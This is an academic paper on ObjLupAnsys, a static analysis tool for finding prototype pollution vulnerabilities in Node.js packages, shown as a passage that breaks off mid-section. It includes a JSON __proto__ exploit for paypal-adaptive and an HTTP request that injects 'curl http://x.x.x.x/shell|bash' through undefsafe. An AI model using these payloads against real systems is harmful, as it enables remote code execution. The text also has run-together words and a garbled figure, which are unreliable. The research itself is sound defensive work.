DetectingNode.jsPrototypePollutionVulnerabilities viaObject
Lookup Analysis
Song Li
lsong18@jhu.edu
Johns Hopkins University
Baltimore,Maryland, USAMingqingKang
mkang31@jhu.edu
Johns Hopkins University
Baltimore,Maryland, USA
Jianwei Hou∗
houjianwei@ruc.edu.cn
Johns Hopkins University/ RenminUniversityof China
Baltimore, USA/ Beijing, ChinaYinzhi Cao
yinzhi.cao@jhu.edu
Johns Hopkins University
Baltimore,Maryland, USA
ABSTRACT
Prototype pollution is a type of vulnerability specific to prototype-
based languages, such as JavaScript, which allows an adversary to
polluteabaseobject’sproperty,leadingtoafurtherconsequence
suchasDenialof Service(DoS),arbitrarycodeexecution, andses-
sion fixation. Onone hand, the onlyprior work in detecting pro-
totypepollutionadoptsdynamicanalysistofuzzpackageinputs,
whichinevitablyhascodecoverageissuesintriggeringsomedeeply
embeddedvulnerabilities.Ontheotherhand,itischallengingtoap-
ply state-of-the-art static analysis in detecting prototype pollution
becauseoftheinvolvementofprototypechainsandfine-grained
objectrelations includingbuilt-inones.
In this paper, we propose a flow-, context-, and branch-sensitive
static taintanalysistool,called ObjLupAnsys ,todetectprototype
pollution vulnerabilities. The key of ObjLupAnsys is a so-called
object lookup analysis, which gradually expands the source and
sink objects into big clusters with a complex inner structure by
performingtargetedobjectlookupsinbothclusterssothatasystem
built-infunctioncanberedefined.Specifically,atthesourcecluster,
ObjLupAnsys proactivelycreatesnewobjectpropertiesbasedon
howthetargetprogramusestheinitialsourceobject;atthesink
cluster,ObjLupAnsys assigns property values in object lookups to
decreasethenumberofobjectlookupstoreachasystembuilt-in
function.
Weimplementedanopen-sourcetoolandapplieditforthedetec-
tionofprototypepollutionamongNode.jspackages.Ourevaluation
shows that ObjLupAnsys finds 61 zero-day, previously-unknown,
exploitable vulnerabilities as opposed to 18 by the state-of-the-art
dynamic fuzzing tool and three by a state-of-the-art static analysis
tool that is modified to detect prototype pollution. To date, 11 vul-
nerable Node.js packages are assigned with CVE numbers and five
have already been patched by their developers. In addition, ObjLu-
pAnsysalso discovered seven applications or packages including a
∗TheauthorcontributedtothepaperasavisitingscholaratJohnsHopkinsUniversity.
Permissionto make digitalor hard copies of part orall ofthis work for personalor
classroom use is granted without fee provided that copies are not made or distributed
forprofitorcommercialadvantageandthatcopiesbearthisnoticeandthefullcitation
onthefirstpage.Copyrightsforthird-partycomponentsofthisworkmustbehonored.
Forallotheruses,contactthe owner/author(s).
ESEC/FSE ’21, August 23ś28,2021, Athens,Greece
©2021 Copyright heldby the owner/author(s).
ACM ISBN 978-1-4503-8562-6/21/08.
https://doi.org/10.1145/3468264.3468542real-world,onlinewebsite,whichareindirectlyvulnerabledueto
the inclusionofvulnerable packages foundby ObjLupAnsys .
CCS CONCEPTS
·Security and privacy →Web application security ;·Soft-
ware andits engineering ;
KEYWORDS
Abstract Interpretation, Prototype Pollution, Object Lookup Analy-
sis, JavaScript
ACMReference Format:
Song Li, Mingqing Kang, Jianwei Hou, and Yinzhi Cao. 2021. Detecting
Node.js Prototype Pollution Vulnerabilities via Object Lookup Analysis. In
Proceedingsofthe29thACMJointEuropeanSoftwareEngineeringConference
andSymposiumontheFoundationsofSoftwareEngineering(ESEC/FSE’21),
August 23ś28, 2021, Athens, Greece. ACM, New York, NY, USA, 12pages.
https://doi.org/10.1145/3468264.3468542
1 INTRODUCTION
JavaScriptisapopularprogramminglanguagewithmanydynamic,
flexible features and being used widely in different platforms in-
cludingNode.js. For example, one notable dynamic feature is that
JavaScript is prototype-based, i.e., any property lookup does not
end up with the present object but goes further up to traverse a
chain of prototypical objects, called a prototype chain, for a defini-
tion. Another interesting, dynamic feature is that JavaScript allows
flexibleredefinitionstocustomizealmostalltheobjectsincluding
built-infunctions.
Interestingly, the combinationof two aforementioned dynamic
features leads to a new type of object-related vulnerabilityÐcalled
prototypepollution[ 7].Specifically,anadversaryabusesvulnera-
blepropertylookupstotraversetheprototypechainforthebase
object and then redefines a built-in function. Let us look at an il-
lustrative example:say,there isa vulnerablestatementwith two
property lookups and an assignment, i.e., obj[a][b]=c . Ifa,b
andcare all controllable by an adversary, the adversary can use
obj["__proto__"]["toString"]="hack" to redefine the built-in
functionObject.prototype.toString .Theconsequenceofproto-
typepollutionissevere,includingDenial-of-Service(DoS),arbitrary
code execution,andsessionfixation, according to prior work [ 7].
268
ESEC/FSE ’21, August 23–28, 2021,Athens,Greece Song Li, MingqingKang,JianweiHou, andYinzhi Cao
There is not much prior work on prototype pollution detection:
The first detection tool from Arteau [ 7] is a dynamic fuzzer that
enumerates different possible attack inputs and then tests whether
thebaseobject’spropertyispolluted.Althoughadynamicanalysis
toollikethefuzzerhasitsadvantages,suchaslowfalsepositives,
thedrawbacksarealsoapparent.First,thefuzzermaynottriggerthe
vulnerable code and thus cannot detect a vulnerability accordingly,
i.e., the relatively low code coverage is an issue. Second, the fuzzer
needs a full installation of the target Node.js package including all
the dependencies, which takes considerable amount of time during
testing.
Another classic research direction in parallel to dynamic analy-
sisistheuseofstaticanalysistodetectJavaScriptvulnerabilities.
DAPP[28]mostlyadopts Abstract SyntaxTree (AST) andcontrol-
flow features as simple detection patterns ofprototype pollution
vulnerabilities.However,becauseDAPPcannothandlerecursive
calls,objectlookups(e.g.,thoseviaaliases)andconstraints,both
thefalsepositiveandnegativeratesareveryhigh(i.e.,50.6%and
84.6% according to the paper).
Regardless of prototype pollution, prior works [ 25,27,36] have
also adopted flow-, context-sensitive and branch-insensitive ab-
stract interpretation to construct accurate control-flows. Then,
some of them, particularly Nodest [ 36], propagate taints from a
sourcelikeexternalinputstoasinksuchasadangerousfunction
call likeevalandexecto detect injection-relatedvulnerabilities.
However, state-of-the-art taint analysis of JavaScript cannot de-
tectprototypepollutionvulnerabilities.Themajorchallengescome
from the complexity of the sink and source structures in prototype
pollutiondetection using staticanalysis.
First, let us start from the sink, which is a system built-
in function such as Object.prototype.toString . The chal-
lenge here is that the sink is implicit, instead of a clearly-
defined function like evalfor injection-related vulnerabilities.
Specifically, an adversary needs to guide the vulnerable pro-
gram to find the sink object gradually in multiple statements
via different lookup paths to finally reach the target. The
aforementioned obj["__proto__"]["toString"] is one lookup
path and obj["constructor"]["prototype"]["toString"] is
another. The lookup path could be arbitrary long as far as the
prototypechainexistsandallthelookupsofapathcanbescattered
indifferentstatements acrossthe entire program.
Second,letusexplainthesource.Manytraditionalvulnerabilities,
such as commandinjection, usually startfrom auserinputwitha
simple type like String, i.e., the source is a single value and can
simply be annotated as tainted from the beginning. By contrast,
theinputinaprototypepollutionvulnerabilityisoftenanobject
withcomplexstructures,e.g.,oneparsedfromaJSONinput.The
challengeisthattheinputobjectstructureisoftenunknownand
dynamic, i.e., being determined by the adversary. A simple mark of
theobjectastainteddoesnotreflecttheinnerstructureandhow
the structure mayaffectthe aforementionedsink objectlookup.
In thispaper,wedesign a flow-, context-,and branch-sensitive
static taintanalysistool,called ObjLupAnsys ,todetectprototype
pollution vulnerabilities. The key insight is that ObjLupAnsys per-
forms a so-called object lookup analysis, which performs condi-
tional object lookups to expand source and sink objects into two
clustersandthenfinallyreachasystembuilt-infunction.Thesourcecluster starts from a few objects directly controllable by the adver-
saryandexpandsasthevulnerableprogramaccessesobjectsinthe
cluster.Forexample,whentheprogramaccesses source[str] ,Ob-
jLupAnsys infersthat sourceobjecthasapropertyandthencreates
one accordingly. The sink cluster starts from a few objects accessi-
blebytheadversaryandexpandstowardssystembuilt-inobjectsso
thattheycanbeoverriddenbytheadversaryinthefuture.Forexam-
ple,whentheprogramexecutes obj[attackVal] ,ObjLupAnsys
includes obj["__proto__"] andobj["constructor"] with the
conditionsthat attackVal equalsto __proto__ andconstructor
respectively.
Tosupportthisobjectlookupanalysis,weproposeanew,hetero-
geneousgraphstructure, calledObjectProperty Graph(OPG). An
OPG represents all the object information (such as variable names
and properties) and objects themselves as nodes in a graph-like
structureandthentherelationsofthosenodesÐsuchasonecon-
tributing to another (i.e., an object-level dataflow) and one being a
propertyofanotherÐviagraphedges.Bydoingso, ObjLupAnsys
not only propagates traditional taints between objects and proper-
ties via dataflow edges but also includes more objects to expand
sourceandsink clustersviaobjectproperty edges.
Specifically,hereishow ObjLupAnsys workstodetectprototype
pollutionvulnerabilities. ObjLupAnsys parsesatargetJavaScript
program into Abstract Syntax Tree (AST) and abstractly interprets
eachnodefollowingcontrol-flowedges.Therearethreestepsinthe
abstract interpretation ofeach ASTnode. First, ObjLupAnsys con-
structs OPGÐe.g., adding or deleting OPG nodes and edgesÐby fol-
lowingthesemanticsoftheASTnode.Second, ObjLupAnsys prop-
agates taints like traditional taint analysis. Note that if conditional
objectlookupsasdescribedbelowareusedinthetaintpropagations,
ObjLupAnsys ensures thatall the constraints putting together are
solvable.Lastly, ObjLupAnsys resolvesadversary-controlledobject
lookups.Iftheobjectisnotcontrollablebytheadversarybutthe
looked-uppropertyis, ObjLupAnsys expandsthesinkobjectcluster
byaddingconditionalOPGedgeswithconstraintsspecifyingthe
adversary-controlledvalueasthepropertynameandshortening
thepathstothesystembuilt-inobjects.Ifboththeobjectandthe
looked-up properties are controllable by the adversary, ObjLupAn-
sysexpands the source object cluster by adding a new property
node to the target source object. During the analysis, if a system
built-in function is redefined, ObjLupAnsys reports a prototype
pollutionvulnerability.
Weevaluatedourprototypeimplementationof ObjLupAnsys in
termsoftruevs.falsepositives,indirectly-vulnerablepackages,and
performance.First, ObjLupAnsys discovered61truepositivesfrom
alltheNode.jspackageswithmorethan1,000weeklydownloadsas
opposedto18frompriorwork[ 7].11ofthemhavealreadyindepen-
dentlyverifiedbyathird-partyvulnerabilitydatabasemaintainer
and assigned with CVE numbers. At the same time, ObjLupAnsys
reports 33 false positives: The true vs. false positive ratio is compa-
rablewithexistingvulnerabilitydetectiontools[ 8,9,26,31,52]and
reasonableforahumanexperttosievethrough.Second, ObjLupAn-
sysfound seven indirectly-vulnerable Node.js applications or pack-
ages including a real-world, online website ( http://jsonbin.org/ ).
The website is vulnerable to Denial of Service (DoS) attack accord-
ingtoourofflinetestingonalocalcopyoftheonlineversion.Lastly,
the performance evaluation on the same benchmark shows that
269DetectingNode.js Prototype PollutionVulnerabilities viaObjectLookup Analysis ESEC/FSE ’21, August 23–28, 2021,Athens,Greece
(a)Vulnerablecode:
1function merge(a, b) {
2 for (varpinb) {
3 try {
4 if(b[p].constructor === Object){
5 a[p] = merge(a[p], b[p]);
6 }else{
7 a[p] = b[p];
8 }
9 }catch(e) {
10 a[p] = b[p];
11 }
12 }
13 return a;
14}
15...
16varPaypal = function (config) {
17if(!config.userId)
18thrownewError('Config must have userId' );
19if(!config.password)
20thrownewError('Config must have password' );
21...
22this.config = merge(defaultConfig, config);
23};
24...
25module.exports = Paypal;
(b)Exploit:
1varPayPal = require( 'paypal-adaptive' );
2varp =newPayPal(JSON.parse(
3 '{"__proto__": {"toString": "polluted"}, "userId":
4 "foo", "password": "bar", "signature": "abcd",
5 "appId": "1234", "sandbox": "1234"}' ))
6console.log(({}).toString);
Figure 1: A motivating example (paypal-adaptive) with a
prototypepollutionvulnerability(CVE-2020-7643)foundby
ObjLupAnsys .
ObjLupAnsys finishes analyzing 90% of Node.js packages with 30
seconds.
We make the following contributions:
•Wedesignedanovelobjectlookupanalysisandproposedagraph
structure, called Object Property Graph (OPG), to support such
an analysisindetecting prototype pollutionvulnerabilities.
•We implemented an open-sourceframework, called ObjLupAn-
sys, to generate OPG, perform object lookup analysis, and de-
tect prototype pollutions. Our implementation is available at
https://github.com/Song-Li/ObjLupAnsys.git .
•ObjLupAnsys found61exploitablezero-dayvulnerabilitiesin61
Node.jspackagesandalsodetectedsevenindirectly-vulnerable
onesduetoinclusionofvulnerablepackages.Thecompletezero-
day vulnerability list is in the aforementioned Github repository.
2 OVERVIEW
In this section, we give an overview by starting from a motivating
example andthen presenting the threatmodel.
2.1 A Motivating Example
In this subsection, we describe a zero-day prototype pollu-
tion vulnerability (CVE-2020-7643) found by ObjLupAnsys in
paypal-adaptive 0.4.2 as a motivating example. Specifically,
paypal-adaptive isansdkforPaypalAdaptivePaymentsandAc-
counts. Users can create a PayPal object with a JSON-formatted
configurationobject,possiblycontrolledbytheadversary,asthe!"#$%&#'()%*+,-
./$-$-0.+ 11./$-$11
-$2-/345
! !!6+/5+'(&
!6+/5+'(%
!6+/5+'(.!7&0.&#'
8+9&:#-;$4935
!"#$%#&'
()*+,-!"#$%&'()*+&()$,&
$-.&#/(()$,&
/*0)/&,($-.&#/()$,&
)*+&12$-.&#/(&,3&(
#4&*/&,(0)(5!"0/&4*/0$)
)*+&12$-.&#/(&,3&(
#4&*/&,(0)(6#$0/&4*/0$)
"0)7($-.&#/(8$$79%(
:0*(%4$/$/;%&(#<*0)
,*/*=8$>(:*89&(*803)+&)/2$:/,+(
;#:<-+/ 234=(;#:<-+/!
"!
!"#"$%&$'()$
!"#"$%&$'()$
!"
>:#4+/&%#+(-$(./$-$-0.+(.$##:-3$4"$94#&($-.&#/(8$$79%(!"#$%"&'("%)*&%+,-+.%/
0*&*("%)*&%+,-+.%/1#+%/
3&)&4*8($-.&#/(8$$79%
!
!
!
Figure 2: An Example Object Property Graph (Note we only
keepimportant,i.e.,vulnerability-relevant,edgesandnodes
and skip many others, e.g., the prototype, constructor and
otherbuilt-inpropertiesofmanyobjects,forthesimplicity
andbeautyofthegraph).
parametertologintoandtransferbalancebetweenPayPalAdaptive
Accounts.
2.1.1 Why is the Package Vulnerable? The vulnerable code of
paypal-adaptive , particularly the vulnerable function merge, is
shown in Figure 1(a), which recursively merges allthe properties
oftwoobjects aandb.WealsoshowtheexploitcodeinFigure 1(b)
anddescribehowtheexploitcodetriggersthevulnerability.Briefly
speaking, the control-flow ofthevulnerabilitytriggeringis asfol-
lows:Line22->Line1->Line5->Line1->Line7. Here are the details
(Notethat we markedtwoimportantobjectlookupsas red):
•Line 22->Line 1: merge(a=defaultConfig ,b=config) . This
function call at Line 22 passes two objects to the vulnerable
mergefunction. The first object, defaultConfig , is created by
the vulnerable program but accessible to the adversary: This
object is used as an entry point for further lookup to the final
sinkobject.Thesecondobject, config,isfullycontrollableby
theadversaryandusedtoguidethefirstobjecttoreachthefinal
sink object.
•Line 5->Line 1: a[p]=merge( a[p],b[p]). This function call
together with an object lookup (the second a[p]marked as
red) makes the adversary one-step further to the final sink
object. Specifically, when we consider the original objects
and the values in the exploit code, the two parameters in
thefunction callbecomes: defaultConfig["__proto__"] and
config["__proto__"]) .
•Line 7: a[p]=b[p]. This object lookup and assign-
ment is the final vulnerable location, which overrides
Object.prototype.toString . Specifically, based on the
newaandb, the statement will expand to the following:
defaultConfig["__proto__"][p]=config["__proto__"][p] .
Then, based on the pvalue inconfig["__proto__"] , the as-
signee becomes defaultConfig["__proto__"]["toString"] ,
i.e.,Object.prototype.toString and the assigner is
config["__proto__"]["toString"] ,whichis "polluted" .
270ESEC/FSE ’21, August 23–28, 2021,Athens,Greece Song Li, MingqingKang,JianweiHou, andYinzhi Cao
2.1.2 Howdoes ObjLupAnsys DetecttheVulnerability? Fromahigh-
level perspective, ObjLupAnsys expands both clusters and reports
a prototype pollution vulnerability if a system built-in object is
redefined.Figure 2showsboth sourceandsinkclustersaswell as
objectlookupsandtaintpropagationsoftwoclustersinFigure 1(a).
This analysis can be brokendown intofour typesof edges: (i)two
object lookups in the source cluster, (ii) one object lookup in the
sink cluster, (iii) two data-related edges with taint propagations,
and(iv)twoconditionalobjectlookups,whicheventuallyleadto
the built-inobjectredefinition.
First, we start from the two object lookups in the source cluster,
whicharethetwo b[p]atLines5and7respectivelyandmarkedas
edges in the source cluster of Figure 2. Both properties are marked
as wildcards (*), because the values (i.e., p) are unknown when
the program looks up the properties. By doing so, ObjLupAnsys
expands the single source object into a complex structure based on
howthe program usedthe sourceobject.
Second, we look at one object lookup in the sink cluster, which
is thea[p]at Lines 5 and marked as the outgoing, red edge of
the green __proto__ node in Figure 2.ObjLupAnsys performs
sink object lookups so that the path to a target system built-in
objectisshortenedintermsofnumberofobjectlookups:Therefore,
ObjLupAnsys performsthelookupvia __proto__ .Notethatthe
red edges are just one possible lookup path and there exists an
alternativepathvia constructor andprototype ,whichcanalso
be foundby ObjLupAnsys .
Third,we describe twodata-relatededges. The firststartsfrom
the first wildcard property in the source cluster, flows to an ob-
ject,andisthenalignedwiththe __proto__ propertyinthesink
cluster; the second starts from the second wildcard property in the
sourcecluster,flowstoanotherobject,andisthenalignedwiththe
toString propertyinthesinkcluster.Bothalignmentsaremade
byObjLupAnsys to reachthe final systembuilt-inobject.
Lastly, we explain two conditional object lookups. The first is
the lookup of aat Line 7 of the second mergecall and denoted
as the left outgoing edge of the anode in Figure 2. The lookup
has a condition that the first wildcard equals to __proto__ . These
conditions are important, because some object lookups may not
be solvable. For example, an adversary cannot pollute a system
built-in object with obj[str][str] , because strcannot be both
__proto__ andtoString at the same time. The secondÐi.e., the
one leading to a prototype pollution reported by ObjLupAnsys Ðis
thelookupof a[p]atLine7.Thelookuphasaconditionthatthe
secondwildcardequalsto toString .Notethattheobjectlookup
alsohaveanothercondition,whichisinheritedwhen ObjLupAnsys
performs the firstconditional objectlookupof aat Line7.
2.1.3 Why is it Hardfor Existing Analysis to Detect the Vulnerabil-
ity?Wenowexplainwhythisisachallengingexampleforexisting
dynamicanalysis,particularlythefuzzerfromArteau[ 7],andexist-
ing static analysis [ 22,25,27,36]. First, the fuzzer from Arteau [ 7]
cannot detect this vulnerability, because the mergefunction can
onlybetriggeredwhenconditionsatLine17and18ofFigure 1are
satisfied; Otherwise, the program will exit directly. This is a classic
tradeoff between staticanddynamicanalysis.
Second,existingstaticanalysis[ 22,25,27,36]doesnotdetectthis
vulnerability,andit is challengingfor them todoso.We listthree(a)Vulnerablecode:
1classNotes {
2edit_note(id, author, raw) {
3undefsafe( this.note_list, id + '.author' , author);
4undefsafe( this.note_list, id + '.raw_note' , raw);
5}
6...
7}
8app.route( '/edit_note' ).post( function (req, res) {
9body=req.body;
10notes.edit_note(body.id, body.author, body.raw);
11})
12app.route( '/status' ).get(function (req, res) {
13...// All elements of the commands array are known.
14for (let index incommands)
15exec(commands[index], {shell: '/bin/bash' }, (err, stdout,
stderr) => {...});
16})
(b)Exploit:
1POST /edit-note id=__proto__.a&author=curl%20http: //x.x.x.x/
shell|bash&raw=123
2GET /status
Figure3:Aexploitablewebserverexample(leadingtocom-
mand injection) that includes undefsafe, a vulnerable pack-
age foundby ObjLupAnsys .
majorreasons.(i)Thesourceobjectthateventuallycompromises
the vulnerable program has a complex, three-layer inner structure.
Existing static analysis only marks configas tainted and thus
cannotdifferentiatethesethreefine-grainedtaintflowsinvolving
different parts of configas shown in Figure 2. (ii) The sink object
is not directly reachable: It is indirectly accessible via two object
lookups, and existing static analysis does not model such complex
lookups.(iii)Thestaticanalysistodetectmanyprototypepollution
vulnerabilitiesrequiresbranchsensitivity,e.g.,theanalysisofLines
5and7inFigure 1.
2.2 ThreatModel
In this subsection, we describe our threat model and also a real-
world example to illustrate the consequence of prototype pollution
vulnerabilities. We consider a Node.js package as vulnerable to
prototypepollutionifanadversarycancontrolpackageinputs,e.g.,
thoseinexportedNode.jsfunctions,whichdirectsthepackageexe-
cution to modify abuilt-in function of Node.js environment. Note
thatourthreatmodelalignswithexistingworksoninjected-related
vulnerabilities in Node.js, such as Synode[ 46]and Nodest [ 36], as
well as historical prototype pollution and injected-related vulnera-
bilitiesinCVE, e.g.,CVE-2019-10744andCVE-2017-16042.
Next, we illustrate an exploitable Node.js web server example
that we find online for the purpose of describing the vulnerability
consequence.Theserverincludesoneofthevulnerablepackages
foundby ObjLupAnsys ,namely undefsafe (Lines3ś4ofthevul-
nerablecode).Thenameof undefsafe seemstosuggestthatitisa
safepackage,butithasaprototypepollutionvulnerabilityallow-
ingadversariestopolluteanypropertiesunderthe Objectobject.
Specifically,anadversarycancraftanHTTPPOSTrequest(Line
1 of the exploit) to create a property under Object, and then the
originally-safe execcall(Line 15 of thevulnerable code)becomes
vulnerable, because the injected property value is accessible via
commands[index] ,leadingtoacommandinjection(Line2ofthe
exploit).
271DetectingNode.js Prototype PollutionVulnerabilities viaObjectLookup Analysis ESEC/FSE ’21, August 23–28, 2021,Athens,Greece
ASTObject Property 
Graph (OPG)
VulnnodeOPG node/
edgesconstraints
next AST Node following control-ﬂowStep 1: AST Node 
InterpretationAbstract 
Interpretation
…Taint PropagationConstraint SolverStep 2: Taint analysis
Source cluster 
expansionStep 3: Object lookup 
analysis
Sink cluster 
expansion
edgesconstraints
built-in
redeﬁned
Figure 4:SystemArchitecture.
Notethatthewebserveritselfissafebecausetheinputsto exec
aresupposedtoberestrictedinanenumerableset.However,the
vulnerabilityin undefsafe makesthis safeweb servervulnerable
and leads to an even severe consequence, i.e., the execution of
arbitrary OS command.
3 DESIGN
In this section, we describe the designof ObjLupAnsys .
3.1 SystemArchitecture
Figure4shows the overall architecture of ObjLupAnsys , which
takestheAbstractSyntaxTree(AST)ofatargetNode.jsprogram
as an input, abstractly interprets the program, and detects whether
theprogramhasaprototypepollutionvulnerabilitybychecking
whethera built-infunction canbe redefined. ObjLupAnsys starts
from the entry points of the AST with adversary-controlled param-
etersastaintedandfollowsthecontrolflowtoanalyzeeachAST
node.Specifically,theanalysiscanbebrokendownintothreesteps.
First,ObjLupAnsys abstractly interprets the target AST node and
constructs a special graph structure, called Object Property Graph
(OPG), which is used for later analysis. Second, ObjLupAnsys per-
formsataintanalysistopropagatetaintsifalltheconstraintscan
be satisfied along a certain propagation path. Lastly, ObjLupAnsys
analyzesvulnerableobjectlookupsbyqueryingOPG,suchas a[b],
wherebcanbetaintedbytheadversary. ObjLupAnsys willexpand
the source and sink cluster based on whether ais tainted by the
adversary and add constraints to cluster expansions. ObjLupAnsys
reports avulnerabilityif abuilt-infunction isredefined.
3.2 AST NodeInterpretation
In this subsection, we describe how ObjLupAnsys abstractly inter-
prets each AST node. We first present the definition OPG and then
describe our branch-sensitive abstract interpretation.
3.2.1 Object Property Graph (OPG). In this part, we introduce
ObjectPropertyGraph(OPG),whichisusedtofacilitateourcluster-
based taint propagation. Specifically, an Object Property Graph
(OPG) is a runtime representation, using graph notation, of all the
JavaScript object interplays such as object properties, object value
influencesandobjectdefinitions.
We start from describing OPG nodes. There are two types of
nodes in OPG as shown in Figure 2: object and name. An object
node represents an object of any type in the abstract interpreta-
tion. Anamenode represents an identifier. It can be a variable
name or a property name of an object. A name node will be un-
der a certain scope in the abstract interpretation, which definesaccessibilityofJavaScriptvariables.Scopesareclassifiedasthree
typesÐglobal, function/file, and blockÐand are connected in a tree
structurebyedges.Aglobalscopenodeistherootofthescopetree
and represents the global runtime environment. Function scope
nodes represent the scope of functions. Block scope nodes repre-
sent the scopes of code blocks like the body of iforfor. Variables
defined by letorconstare under a block scope and accessible
only within the same blockscope.
We then describe OPG edges, which can be roughly classified as
property-relatedforobjectlook-upsand data-related.First, OPG
has two types of edges to represent object lookups, which are
name→objectandobject →nameedges.Forexample,theonebe-
tweenthe defaultConfig namenodeandtheconnectedobjectisa
name→objectedge.Theobjectnodefurtherpointstoanamenode
__proto__ ,which indicatesthat defaultConfig hasa childprop-
erty and the edge between them is an object →name edge. Second,
OPGhastwotypesofdata-relatededges:source-sinkobjectlookup
alignment edges and (traditional) dataflow edges. The former is
made by ObjLupAnsys to align a source object lookup to a sink
object lookup bymatching the input value with the property. The
latterisjustadataflowedge(∗− →)betweenobjectandnamenodes
as showninFigure 2.
3.2.2 Branch-sensitiveAbstract Interpretation. In this part, we de-
scribethebranch-sensitiveabstractinterpretationdesign. ObjLu-
pAnsysadopts different strategies for different types of AST nodes
and constructs corresponding OPG. We describe some represen-
tative AST node types below due to space limit and similarity in
semantics.
•Branch-sensitiveInterpretationofConditionalStatements. Ob-
jLupAnsys executesbothorallbranchesofaconditional state-
ment in parallel assuming that the condition can be satis-
fied, called branching, constructs OPG during the execution
of each branch, and then merges the branched OPGs into one,
called merging. (i) Branching. During the branching stage, every
name→object edgeinthe OPG, nomatter addedordeleted,is
accompanied by a tag to indicate the corresponding branch, e.g.,
consequentoralternativebranchin ifstatement,andtheopera-
tion,i.e.,additionordeletion.Suchatagisaddedrecursivelyif
multiplebranchesarepresent,i.e.,anedgemayhavetwotagsun-
dertwonested ifstatements.When ObjLupAnsys looks up an
identifier, ObjLupAnsys onlyfollowsedgesthathavethecorrect
branchingtagandarenotdeletedunderthisbranch.(ii) Merging.
Duringthemergingstage, ObjLupAnsys keepsanaddededge
as long as the edge has one branching tagand deletes an edge
if the edge is deleted by all the branches. Say for example, if a
variable is redefined in both branches of an ifstatement, the
oldname →objectedgeisdeleted.However,ifonlyonebranch
redefinesthevariable,boththeoldandthenewname →object
edge are preserved.
•Loops.ObjLupAnsys tries its best to calculate the loop condi-
tionbased on allthe known values, e.g., constant variables, and
executes loops. If ObjLupAnsys cannot estimate the number of
executedtimes, ObjLupAnsys executesaloopextensivelyuntil
nomoreobjectsoutsidetheloopbecometainted.Herearethe
details based on the loop type. (i) ObjLupAnsys first executes
its pre-run-block in the forloop, determines whether to run
272ESEC/FSE ’21, August 23–28, 2021,Athens,Greece Song Li, MingqingKang,JianweiHou, andYinzhi Cao
the loop, and executes its post-run-block. (ii) The procedure of a
whileloopissimilartoa forloopbutwithoutpost-run-block
execution. (iii) ObjLupAnsys goes over all the properties of a
for...in orfor...of loopunderatargetobjectandexecutes
the loop body with each property name or object as a parameter.
•FunctionCallandNewOperation.Wegroupfunctioncalland
newoperationtogetherbecausebothinvolvetheinvocationof
afunction.Wedescribehow ObjLupAnsys handlesbothopera-
tionsviafoursteps.First, ObjLupAnsys looksupthefunctionob-
jectintheOPGandfindsitsdefinition.Second,ifthisisa newop-
eration,ObjLupAnsys createsanewobjectandthenpoints this
pointertothenewobject. ObjLupAnsys alsoaddsthefunction
objectinthe newoperationasthenewobject’s constructor and
the function object’s prototype as the new object’s __proto__ .
Third,ObjLupAnsys adds dataflow edges for all the function
parametersandexecutesthefunctionbody.Notethatifthefunc-
tionisabuilt-inoneimplementednatively, ObjLupAnsys will
simulateitsbehaviorasdocumentedinECMAScriptandNode.js.
Lastly, if this is a newoperation, ObjLupAnsys points the return
objectto the newobjectandalsorestores the thispointer.
3.3 Taint Analysis
Inthis subsection,we describethetaint analysis,which canbedi-
videdintotwosub-steps.First, ObjLupAnsys collectstheconditions
that are attached to object lookups for the target AST node and
thenconvertstheseconditionsintoconstraintsthatareunderstand-
ablebyaconstraintsolver.Second,ifallthecollectedconstraints
are satisfiable, ObjLupAnsys will propagate taints between objects
basedonthe target AST node type.
3.3.1 ConstraintCollectionandSolving. Inthispart,wedescribe
howObjLupAnsys collectsandsolvesconstraintsbeforetaintprop-
agation. Specifically, ObjLupAnsys records all the conditions at-
tached to object lookups and then traverses backward along the
dataflowedgerelatedtoeachconditiontocollectconstraints.Letus
takealookatLine7inthesecond mergerunofFigure 1.ObjLupAn-
syscollectstwoconditionsmarkedascirclednumbersoneandtwo
inFigure 2:Circledoneisfromtheobjectlookupof aandtheother
circled two is from the vulnerable object lookup of b[p].ObjLu-
pAnsysthen traverses backward the original dataflow edge to find
the wildcardpropertiesand generates twoconstraintsÐThese two
constraints are obviously solvable because they are independent
from eachother.
3.3.2 Taint Propagation. In this part, we describe how ObjLupAn-
syspropagatestaintsifalltheconstraintstogetheraresatisfiable.
We illustrate the propagation using two major AST node types:
operators (such as plus and minus) and built-in function calls. (i)
ObjLupAnsys propagates taints from operands to the result for op-
erators.(ii) ObjLupAnsys modelsbuilt-infunctionsandpropagates
taints from parameters to the return value based on the built-in
function.Notethatthetaintpropagationadoptedby ObjLupAnsys
isontheobjectlevelinsteadofstatementlevelinprogramdepen-
dencygraph(PDG).Themajoradvantageisthatiftwovariables
pointtothesameobject,e.g., tmp1=tmp2 ,ObjLupAnsys doesnot
needtopropagatetaintsbecausethepropagationiswithinthesame
object.Source Cluster 
Expansion
Sink Cluster 
ExpansionTarget Object 
Lookup a[b]Is a tainted?b is tainted 
Creating a 
wildcard (*) objectY
N
Reducing lookup 
distance between 
built-in objects
Figure 5:Flowchart forObject Lookup Analysis.
3.4 Object LookupAnalysis
Inthissubsection,wedescribehow ObjLupAnsys handlesobject
lookups that are potentially vulnerable to prototype pollution in
Figure5. Specifically, we call an object lookup in the format of
a[b]vulnerableif biscontrollablebytheadversary,i.e.,marked
astainted.Therearetwosub-cases:(i)if aisalsocontrollableby
the adversary, the object lookup is entirely controllable by the
adversary, thus being considered as an expansion of the source
cluster, and (ii) if ais not controllable but only accessible to the
adversaryvia b,thisobjectlookupisapathtoredefineabuilt-in
function, thus consideredas an expansion of the sink cluster.
Afterobjectlookupanalysis, ObjLupAnsys willcheckwhether
asystembuilt-infunctionisredefined,i.e.,whetherthereexistsa
solvableedgefromasystemnamenodetoanattacker-controlled
object node. If the answer is yes, i.e., the existence of the second
conditionaledgeatthebottomofFigure 2,ObjLupAnsys willreport
aprototype pollutionvulnerability.
3.4.1 Source Cluster Expansion. In this part, we describe how Ob-
jLupAnsys expandsthesourcecluster.Thehigh-levelideaisthat
ObjLupAnsys graduallyaddsnewpropertiestothesourceobject
based on how the target program uses the object. For example, the
program in Figure 1(a) accesses the source object configtwice
in twomergecalls and therefore ObjLupAnsys creates two wild-
card (∗) properties under config. Here is the detailed procedure.
Particularly, when ObjLupAnsys handlesa[b],ObjLupAnsys first
createsawildcard( ∗)namenodeunder a.Next,ObjLupAnsys looks
upbto find the object node. Then, ObjLupAnsys follows dataflow
edges (∗− →) both forward and backward to find out the value of the
objectnode.Ifthevalueisknown,e.g.,determinedbeforeinobject
lookups,ObjLupAnsys creates another dataflow edge between the
objectandthe name node.
3.4.2 Sink Cluster Expansion. In this part, we describe how Ob-
jLupAnsys expands the sink cluster. The high-level idea is that
